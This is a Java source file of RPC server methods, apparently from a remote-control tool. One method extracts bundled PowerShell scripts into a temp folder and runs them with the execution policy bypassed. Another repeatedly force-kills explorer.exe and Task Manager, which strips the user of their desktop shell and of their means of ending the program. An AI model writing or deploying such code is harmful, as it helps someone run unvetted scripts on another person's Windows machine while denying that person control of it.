package main.server;

import java.io.*;

public class RpcServerMethods {

    // Helper method to run a PowerShell script
    private void runScript(String psScriptPath) {
        try {
            ProcessBuilder pb = new ProcessBuilder( //Makes new ProcessBuilder to start Powershell
                    "powershell.exe", "-ExecutionPolicy", "Bypass", "-File", psScriptPath);

            pb.redirectErrorStream(true); //Redirects all errors from Powershell
            Process process = pb.start(); //Starts the process

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            //Waits until the script is finished.
            int exitCode = process.waitFor();
            System.out.println("PowerShell script exited with code: " + exitCode);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void runScriptWithResources(String scriptName, String... resourceNames) {
        try {
            // Create a temporary directory for the script and resources
            File tempDir = new File(System.getProperty("java.io.tmpdir"), "toast_" + System.nanoTime());
            tempDir.mkdir();

            // Extract the script to the temp directory
            File ps1File = new File(tempDir, scriptName);
            try (InputStream in = getClass().getClassLoader().getResourceAsStream(scriptName);
                 FileOutputStream out = new FileOutputStream(ps1File)) {
                if (in == null) throw new FileNotFoundException("Resource not found: " + scriptName);
                byte[] buffer = new byte[1024];
                int len;
                while ((len = in.read(buffer)) > 0) out.write(buffer, 0, len);
            }
            ps1File.deleteOnExit();

            // Extract any additional resources (e.g. images, wav) to the same folder
            for (String res : resourceNames) {
                File resFile = new File(tempDir, res);
                try (InputStream in = getClass().getClassLoader().getResourceAsStream(res);
                     FileOutputStream out = new FileOutputStream(resFile)) {
                    if (in == null) throw new FileNotFoundException("Resource not found: " + res);
                    byte[] buffer = new byte[1024];
                    int len;
                    while ((len = in.read(buffer)) > 0) out.write(buffer, 0, len);
                }
                resFile.deleteOnExit();
            }

            // Run the PowerShell script with the temp directory as working directory
            ProcessBuilder pb = new ProcessBuilder(
                    "powershell.exe", "-ExecutionPolicy", "Bypass", "-File", ps1File.getAbsolutePath());
            pb.directory(tempDir); // so relative paths work!
            pb.redirectErrorStream(true);
            Process process = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            int exitCode = process.waitFor();
            System.out.println("PowerShell script exited with code: " + exitCode);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void runKillTaskmngrAndExp() {
        int loopsDone = 0;
        while(true) {
            try {
                // Kill explorer.exe
                Process explorer = Runtime.getRuntime().exec("taskkill /F /IM explorer.exe");
                explorer.waitFor();

                // Kill Taskmgr.exe
                Process taskmgr = Runtime.getRuntime().exec("taskkill /F /IM Taskmgr.exe");
                taskmgr.waitFor();

//                System.out.println("explorer.exe and Taskmgr.exe killed!");
                if(loopsDone > 20) {
                    break;
                }
                else {
                    loopsDone++;
                    Thread.sleep(500);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
